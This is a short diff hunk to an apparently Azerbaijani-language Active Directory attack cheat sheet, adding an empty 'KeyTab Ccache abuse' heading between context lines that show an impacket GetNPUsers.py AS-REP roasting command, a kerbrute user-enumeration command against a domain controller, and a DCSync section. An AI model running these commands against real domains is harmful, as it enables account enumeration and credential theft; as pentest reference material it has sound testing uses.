@@ -77,6 +77,10 @@ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN.LOCAL/ -us
 # Kerbrute ile service enumeration
 kerbrute userenum -d DOMAIN.LOCAL --dc 10.10.10.10 usernames.txt
 
+====== KeyTab Ccache Sui-istifadə ====================================================================================================================================
+
+
+
 ====== DCSync Attack (Ən effektiv) ================================================================================================================================================================
 
 # Domain Admin və ya DCSync rights lazımdır
